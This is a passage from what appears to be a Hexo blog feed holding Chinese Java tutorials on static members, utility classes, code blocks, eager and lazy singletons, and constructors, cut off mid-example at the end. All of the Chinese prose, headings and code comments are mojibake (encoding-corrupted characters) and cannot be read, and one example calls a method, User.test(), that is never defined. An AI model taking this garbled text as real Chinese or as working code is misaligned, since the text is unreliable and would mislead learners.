        <content type="html"><![CDATA[<h2 id="ä¸€ã€åŸºæœ¬ç”¨æ³•"><a href="#ä¸€ã€åŸºæœ¬ç”¨æ³•" class="headerlink" title="ä¸€ã€åŸºæœ¬ç”¨æ³•"></a>ä¸€ã€åŸºæœ¬ç”¨æ³•</h2><h3 id="1ã€é™æ€æˆå‘˜å˜é‡ã€æ–¹æ³•"><a href="#1ã€é™æ€æˆå‘˜å˜é‡ã€æ–¹æ³•" class="headerlink" title="1ã€é™æ€æˆå‘˜å˜é‡ã€æ–¹æ³•"></a>1ã€é™æ€æˆå‘˜å˜é‡ã€æ–¹æ³•</h3><p>staticä¿®é¥°çš„æˆå‘˜å˜é‡ä¸ºé™æ€æˆå‘˜å˜é‡ï¼Œåœ¨å†…å­˜ä¸­<strong>åªå­˜å‚¨ä¸€ä»½</strong>ï¼Œå¯ä»¥è¢«<strong>å…±äº«ä¿®æ”¹ã€æ“ä½œ</strong>ï¼Œå±äºç±»ï¼Œéšç±»äº§ç”Ÿï¼Œç±»åŠ è½½æ—¶è¢«åˆå§‹åŒ–ã€‚</p><p>æˆå‘˜å˜é‡åˆ†ä¸ºé™æ€æˆå‘˜å˜é‡å’Œç¤ºä¾‹æˆå‘˜å˜é‡ï¼š</p><ul><li>  é™æ€æˆå‘˜å˜é‡ï¼šæœ‰staticä¿®é¥°ï¼Œå±äºç±»ï¼Œå¯ä½¿ç”¨Class.Nameï¼ˆæ¨èï¼‰ æˆ– Project.Nameï¼ˆä¸æ¨èï¼‰è®¿é—®ï¼Œå¸¸ç”¨è¡¨ç¤ºåœ¨çº¿äººæ•°ç­‰éœ€è¦å…±äº«çš„ä¿¡æ¯</li><li>  å®ä¾‹æˆå‘˜å˜é‡ï¼šæ— staticä¿®é¥°ï¼Œå­˜åœ¨æ¯ä¸ªå¯¹è±¡ä¸­ï¼Œä½¿ç”¨ Project.Nameè®¿é—®ï¼Œå¸¸è¡¨ç¤ºå¹´é¾„ã€å§“åç­‰å±äºæ¯ä¸ªå¯¹è±¡çš„ä¿¡æ¯</li></ul><p>é™æ€æˆå‘˜æ–¹æ³•ä¸é™æ€æˆå‘˜å˜é‡ä¸€æ ·ï¼Œä½¿ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p><ul><li>  é™æ€æˆå‘˜æ–¹æ³•ï¼šå®ç°ä¸€ä¸ªé€šç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ç™»å½•</li><li>  ç¤ºä¾‹æˆå‘˜æ–¹æ³•ï¼šè¡¨ç¤ºå¯¹è±¡è‡ªå·±çš„è¡Œä¸ºï¼Œå¦‚æ·»åŠ å¥½å‹ã€åƒé¥­ã€ç¡è§‰</li></ul><p>é™æ€æˆå‘˜å˜é‡å†…å­˜å›¾ï¼š</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220106120926680.png" alt="image-20220106120926680"></p><p>é™æ€æˆå‘˜æ–¹æ³•å†…å­˜å›¾ï¼š</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220106122029190.png" alt="image-20220106122029190"></p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åœ¨çº¿äººæ•°ï¼Œé™æ€æˆå‘˜å˜é‡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> onlineNumber;</span><br><span class="line">    <span class="comment">// é™æ€æˆå‘˜æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;é™æ€æˆå‘˜æ–¹æ³•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num = User.onlineNumber;</span><br><span class="line">        System.out.println(num);</span><br><span class="line">        User.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2ã€ä½¿ç”¨é™æ€æ–¹æ³•å®šä¹‰å·¥å…·ç±»"><a href="#2ã€ä½¿ç”¨é™æ€æ–¹æ³•å®šä¹‰å·¥å…·ç±»" class="headerlink" title="2ã€ä½¿ç”¨é™æ€æ–¹æ³•å®šä¹‰å·¥å…·ç±»"></a>2ã€ä½¿ç”¨é™æ€æ–¹æ³•å®šä¹‰å·¥å…·ç±»</h3><p>åˆ©ç”¨staticä¿®é¥°ç¬¦åˆ›å»ºé™æ€æˆå‘˜æ–¹æ³•ï¼Œå¹¶å°†æ„é€ å™¨ç§æœ‰åŒ–ï¼Œå³å¯å®ç°é™æ€æ–¹æ³•åªèƒ½è¢«ç±»è°ƒç”¨è®¿é—®ï¼Œä»¥æ­¤å®ç°å·¥å…·ç±»ã€‚</p><p>ä¸€èˆ¬å°†é€šç”¨é‡å¤ä½¿ç”¨çš„åŠŸèƒ½åˆ›å»ºä¸ºå·¥å…·ç±»ï¼Œä¸€ç”ŸæˆéªŒè¯ç ä¸ºä¾‹ï¼š</p><p>å°è£…å®ç°å·¥å…·ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * å·¥å…·ç±»ï¼Œå°è£…ç”Ÿæˆåªå½“é•¿åº¦éªŒè¯ç </span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VerifyCodeTool</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ å™¨ç§æœ‰åŒ–</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">VerifyCodeTool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">createVerifyCode</span><span class="params">(<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">        String charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        String verifyCode = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="comment">// ç”Ÿæˆéšæœºä¸‹æ ‡</span></span><br><span class="line">            <span class="keyword">int</span> index = random.nextInt(charset.length());</span><br><span class="line">            <span class="comment">// æ ¹æ®ä¸‹æ ‡å–å­—ç¬¦ï¼Œæ‹¼æ¥</span></span><br><span class="line">            verifyCode += charset.charAt(index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> verifyCode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨å·¥å…·ç±»ï¼Œç”ŸæˆéªŒè¯ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.print(<span class="string">&quot;è¾“å…¥éªŒè¯ç é•¿åº¦ï¼š&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> length = scanner.nextInt();</span><br><span class="line">        <span class="comment">// è°ƒç”¨å·¥å…·ç±»ç”ŸæˆéªŒè¯ç </span></span><br><span class="line">        String verifyCode = VerifyCodeTool.createVerifyCode(length);</span><br><span class="line">        System.out.println(verifyCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220106211308698.png" alt="image-20220106211308698"></p><h3 id="3ã€ä½¿ç”¨é™æ€æ–¹æ³•å®šä¹‰æ•°ç»„å¤„ç†å·¥å…·ç±»"><a href="#3ã€ä½¿ç”¨é™æ€æ–¹æ³•å®šä¹‰æ•°ç»„å¤„ç†å·¥å…·ç±»" class="headerlink" title="3ã€ä½¿ç”¨é™æ€æ–¹æ³•å®šä¹‰æ•°ç»„å¤„ç†å·¥å…·ç±»"></a>3ã€ä½¿ç”¨é™æ€æ–¹æ³•å®šä¹‰æ•°ç»„å¤„ç†å·¥å…·ç±»</h3><p>åˆ›å»ºä¸€ä¸ªæ•°ç»„å¤„ç†å·¥å…·ç±»ï¼Œè¦æ±‚å°†æ•´æ•°æ•°ç»„è¾“å‡ºä¸ºå­—ç¬¦ä¸²æ ¼å¼ï¼š[1, 2, 3, 4]ï¼Œéœ€è¦è€ƒè™‘nullå’Œç©ºæ•°ç»„</p><p>ArrayUitlså·¥å…·ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* å°†æ•´æ•°æ•°ç»„è¾“å‡ºä¸º [1ï¼Œ 2ï¼Œ 3]çš„å­—ç¬¦ä¸²å½¢å¼</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ArrayUtils</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toString</span><span class="params">(<span class="keyword">int</span>[] array)</span></span>&#123;</span><br><span class="line">        String arrayString = <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (array != <span class="keyword">null</span>)&#123;</span><br><span class="line">            arrayString = <span class="string">&quot;[&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">                arrayString += (i == array.length - <span class="number">1</span> ? array[i] : array[i] + <span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            arrayString += <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arrayString;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220106215432511.png" alt="image-20220106215432511"></p><h3 id="4ã€staticæ³¨æ„äº‹é¡¹"><a href="#4ã€staticæ³¨æ„äº‹é¡¹" class="headerlink" title="4ã€staticæ³¨æ„äº‹é¡¹"></a>4ã€staticæ³¨æ„äº‹é¡¹</h3><ul><li>  é™æ€æ–¹æ³•åªèƒ½è®¿é—®é™æ€æˆå‘˜ï¼Œä¸èƒ½è®¿é—®å®ä¾‹æˆå‘˜ï¼Œå› ä¸ºå®ä¾‹æˆå‘˜å±äºå¯¹è±¡</li><li>  é™æ€æ–¹æ³•ä¸­ä¸èƒ½ç”¨thiså…³é”®å­—ï¼Œthisè¡¨ç¤ºå½“å‰å¯¹è±¡ï¼Œé™æ€æ–¹æ³•å±äºç±»ï¼Œæ— å¯¹è±¡</li></ul><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220107121018850.png" alt="image-20220107121018850"></p><h2 id="äºŒã€ä»£ç å—"><a href="#äºŒã€ä»£ç å—" class="headerlink" title="äºŒã€ä»£ç å—"></a>äºŒã€ä»£ç å—</h2><p>ä½¿ç”¨{}æ‹¬èµ·æ¥çš„ä»£ç ç§°ä¹‹ä¸ºä»£ç å—ï¼Œåˆ†ä¸ºé™æ€ä»£ç å—å’Œæ„é€ ä»£ç å—ï¼š</p><ul><li>é™æ€ä»£ç å—ï¼ˆä½¿ç”¨staticä¿®é¥°ï¼‰<br>  æ ¼å¼ï¼š<strong>static{}</strong><br>  ç‰¹ç‚¹ï¼šéšç±»åŠ è½½ï¼Œè‡ªåŠ¨è§¦å‘ï¼ŒåªåŠ è½½ä¸€æ¬¡<br>  åœºæ™¯ï¼šåœ¨ç±»åŠ è½½æ—¶åšä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œæ–¹ä¾¿åç»­ä½¿ç”¨</li><li>æ„é€ ä»£ç å—ï¼ˆæ— ä¿®é¥°ï¼Œä¸å¸¸ç”¨ï¼‰<br>  æ ¼å¼ï¼š**{}**<br>  ç‰¹ç‚¹ï¼šæ¯æ¬¡åˆ›å»ºå¯¹è±¡æ—¶æ‰§è¡Œè¯¥ä»£ç ï¼Œåœ¨æ„é€ å™¨ä¹‹å‰æ‰§è¡Œ<br>  æƒ…æ™¯ï¼šåˆå§‹åŒ–å®åŠ›å®ä¾‹èµ„æº</li></ul><p>é™æ€ä»£ç å—å¯ç”¨äºåˆå§‹åŒ–é™æ€èµ„æºã€‚</p><h2 id="ä¸‰ã€å•ä¾‹è®¾è®¡æ¨¡å¼"><a href="#ä¸‰ã€å•ä¾‹è®¾è®¡æ¨¡å¼" class="headerlink" title="ä¸‰ã€å•ä¾‹è®¾è®¡æ¨¡å¼"></a>ä¸‰ã€å•ä¾‹è®¾è®¡æ¨¡å¼</h2><p>åˆ©ç”¨staticä¿®é¥°ç¬¦ï¼Œå¯ç”¨æ¥å®ç°ä¸¤ç§å•ä¾‹è®¾è®¡æ¨¡å¼ï¼š<strong>é¥¿æ±‰æ¨¡å¼</strong>å’Œ<strong>æ‡’æ±‰æ¨¡å¼</strong>ï¼Œæ‰€è°“å•ä¾‹æ¨¡å¼æ˜¯æŒ‡<strong>ä¿è¯ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨å•ä¾‹æ¨¡å¼çš„ç±»åªèƒ½åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚</strong></p><h3 id="1ã€é¥¿æ±‰å•ä¾‹æ¨¡å¼"><a href="#1ã€é¥¿æ±‰å•ä¾‹æ¨¡å¼" class="headerlink" title="1ã€é¥¿æ±‰å•ä¾‹æ¨¡å¼"></a>1ã€é¥¿æ±‰å•ä¾‹æ¨¡å¼</h3><p>å«ä¹‰ï¼šåœ¨ç”¨ç±»è·å–å¯¹è±¡æ—¶ï¼Œå¯¹è±¡å·²ç»æå‰åˆ›å»ºå¥½ã€‚</p><p>å®ç°ï¼š</p><ul><li>  æ„é€ å™¨ç§æœ‰åŒ–</li><li>  å®šä¹‰ä¸€ä¸ªé™æ€å˜é‡å­˜å‚¨å¯¹è±¡</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* é¥¿æ±‰å•ä¾‹æ¨¡å¼</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleInstance1</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰é™æ€å˜é‡å­˜å‚¨å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SingleInstance1 instance = <span class="keyword">new</span> SingleInstance1();</span><br><span class="line">    <span class="comment">// æ„é€ å™¨ç§æœ‰åŒ–</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SingleInstance1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220108191215069.png" alt="image-20220108191215069"></p><h3 id="2ã€æ‡’æ±‰å•ä¾‹æ¨¡å¼"><a href="#2ã€æ‡’æ±‰å•ä¾‹æ¨¡å¼" class="headerlink" title="2ã€æ‡’æ±‰å•ä¾‹æ¨¡å¼"></a>2ã€æ‡’æ±‰å•ä¾‹æ¨¡å¼</h3><p>å«ä¹‰ï¼šéœ€è¦å¯¹è±¡æ—¶ï¼Œæ‰ä¸ºå…¶åˆ›å»ºå¯¹è±¡ï¼ˆå»¶è¿ŸåŠ è½½å¯¹è±¡ï¼‰ã€‚</p><p>å®ç°ï¼š</p><ul><li>  æ„é€ å™¨ç§æœ‰åŒ–</li><li>  å®šä¹‰ä¸€ä¸ªé™æ€å˜é‡å­˜å‚¨å¯¹è±¡ï¼Œå¹¶ç§æœ‰åŒ–</li><li>  æä¾›ä¸€ä¸ªè¿”å›å•ä¾‹å¯¹è±¡çš„æ–¹æ³•ï¼ˆgetInstanceï¼‰</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* æ‡’æ±‰å•ä¾‹æ¨¡å¼</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleInstance2</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰ç§æœ‰åŒ–é™æ€å˜é‡å­˜å‚¨å¯¹è±¡ï¼Œæœªè°ƒç”¨å…ˆç½®ç©ºï¼ˆè¾“å‡ºä¸ºnullï¼‰</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SingleInstance2 instance;</span><br><span class="line">    <span class="comment">// å®šä¹‰è¿”å›å•ä¾‹å¯¹è±¡çš„æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingleInstance2 <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­æ˜¯å¦å·²ç»åˆ›å»º</span></span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>)&#123;</span><br><span class="line">            instance = <span class="keyword">new</span> SingleInstance2();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ„é€ å™¨ç§æœ‰åŒ–</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SingleInstance2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220108193819741.png" alt="image-20220108193819741"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>é¥¿æ±‰å•ä¾‹æ¨¡å¼æ–¹ä¾¿ï¼Œä½†æ˜¯å ç”¨å†…å­˜èµ„æºï¼Œå¯èƒ½è°ƒç”¨æœ‰çš„ç±»å¹¶ä¸éœ€è¦å®ä¾‹åŒ–å¯¹è±¡ï¼Œä½†æ˜¯é¥¿æ±‰å•ä¾‹æ¨¡å¼é»˜è®¤åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚</p><p>æ‡’æ±‰å•ä¾‹æ¨¡å¼çœèµ„æºï¼Œä¸€èˆ¬ç”¨çš„æ¯”è¾ƒå¤šã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå­¦ä¹ ä¹‹è·¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaå­¦ä¹ ä¹‹è·¯ã€‘SE2 - é¢å‘å¯¹è±¡åŸºç¡€çŸ¥è¯†</title>
      <link href="post/20211162133.html"/>
      <url>post/20211162133.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€æ„é€ å™¨å’Œthiså…³é”®å­—"><a href="#ä¸€ã€æ„é€ å™¨å’Œthiså…³é”®å­—" class="headerlink" title="ä¸€ã€æ„é€ å™¨å’Œthiså…³é”®å­—"></a>ä¸€ã€æ„é€ å™¨å’Œthiså…³é”®å­—</h2><h3 id="1ã€æ„é€ å™¨"><a href="#1ã€æ„é€ å™¨" class="headerlink" title="1ã€æ„é€ å™¨"></a>1ã€æ„é€ å™¨</h3><p>Javaç±»ä¸­è‡ªå¸¦æ„é€ å™¨ï¼Œå®é™…æ˜¯ä¸€ä¸ªç±»åŒåçš„æ–¹æ³•ï¼Œé»˜è®¤å‚æ•°ä¸ºç©ºï¼Œæƒ³æŒ‡å®šå‚æ•°éœ€è¦é‡å†™ã€‚</p><p>Javaæ„é€ å™¨ç±»ä¼¼Pythonçš„æ„é€ å‡½æ•°ï¼Œéƒ½æ˜¯åœ¨åˆå§‹åŒ–ç±»æ—¶è°ƒç”¨ï¼Œä¸åŒçš„æ˜¯Javaå¯ä»¥åŒæ—¶å­˜åœ¨æœ‰å‚å’Œæ— å‚ä¸¤ä¸ªæ„é€ å™¨ã€‚</p><p>æŒ‡å®šå‚æ•°åæƒ³å†æ¬¡ä½¿ç”¨æ— å‚æ„é€ å™¨ï¼Œéœ€è¦å£°æ˜ä¸€ä¸ªæ— å‚çš„ã€‚</p><h3 id="2ã€thiså…³é”®å­—"><a href="#2ã€thiså…³é”®å­—" class="headerlink" title="2ã€thiså…³é”®å­—"></a>2ã€thiså…³é”®å­—</h3><p>thiså…³é”®å­—ä»£è¡¨å½“å‰å¯¹è±¡æœ¬èº«çš„åœ°å€ï¼Œç±»ä¼¼äºPythonçš„selfï¼š</p><ul><li>  Javaï¼šthis.name</li><li>  Pythonï¼šself.name</li></ul><h3 id="3ã€ç¤ºä¾‹"><a href="#3ã€ç¤ºä¾‹" class="headerlink" title="3ã€ç¤ºä¾‹"></a>3ã€ç¤ºä¾‹</h3><p>Personç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">double</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ— å‚æ„é€ å™¨ï¼Œé»˜è®¤å­˜åœ¨</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ï¼æ— å‚æ„é€ å™¨&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœ‰å‚æ„é€ å™¨ï¼Œéœ€è‡ªå®šä¹‰</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">double</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;ï¼æœ‰å‚æ„é€ å™¨&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Testç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person user1 = <span class="keyword">new</span> Person();</span><br><span class="line">        System.out.println(<span class="string">&quot;å§“åï¼š&quot;</span> + user1.name);</span><br><span class="line">        System.out.println(<span class="string">&quot;å¹´é¾„ï¼š&quot;</span> + user1.age);</span><br><span class="line"></span><br><span class="line">        Person user2 = <span class="keyword">new</span> Person(<span class="string">&quot;å¼ ä¸‰&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;å§“åï¼š&quot;</span> + user2.name);</span><br><span class="line">        System.out.println(<span class="string">&quot;å¹´é¾„ï¼š&quot;</span> + user2.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20211231000340329.png" alt="image-20211231000340329"></p><h2 id="äºŒã€å°è£…"><a href="#äºŒã€å°è£…" class="headerlink" title="äºŒã€å°è£…"></a>äºŒã€å°è£…</h2><h3 id="1ã€å°è£…æ¦‚å¿µ"><a href="#1ã€å°è£…æ¦‚å¿µ" class="headerlink" title="1ã€å°è£…æ¦‚å¿µ"></a>1ã€å°è£…æ¦‚å¿µ</h3><p>é¢å‘å¯¹è±¡çš„ä¸‰å¤§ç‰¹å¾ï¼šå°è£…ã€ç»§æ‰¿ã€å¤šæ€ã€‚</p><p>ä¸ºäº†é˜²æ­¢ç±»æˆå‘˜å˜é‡è¢«ç›´æ¥å¤–éƒ¨è°ƒç”¨æ“ä½œï¼Œä¸€èˆ¬å°†æˆå‘˜å˜é‡è®¾å®šä¸ºprivateç§æœ‰ç±»å‹ï¼Œä¸æš´æ¼åœ¨å¤–ï¼Œå®šä¹‰å¯¹å¤–çš„setterå’Œgetteræ–¹æ³•æ¥å¯¹å…¶æ“ä½œï¼Œåœ¨setterå’Œgetteræ–¹æ³•ä¸­å†™å…¥ç›¸å…³åˆæ³•åˆ¤æ–­ï¼Œç”¨æˆ·åœ¨è¿›è¡Œå­˜å–æ•°æ®æ—¶ï¼Œåªéœ€è¦è°ƒç”¨setterå’Œgetteræ–¹æ³•å³å¯ã€‚</p><p>å¥½å¤„ï¼šå¢å¼ºä»£ç çš„å®‰å…¨æ€§ã€æé«˜å¼€å‘æ•ˆç‡ã€‚</p><h3 id="2ã€ç¤ºä¾‹"><a href="#2ã€ç¤ºä¾‹" class="headerlink" title="2ã€ç¤ºä¾‹"></a>2ã€ç¤ºä¾‹</h3><p>Personç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span 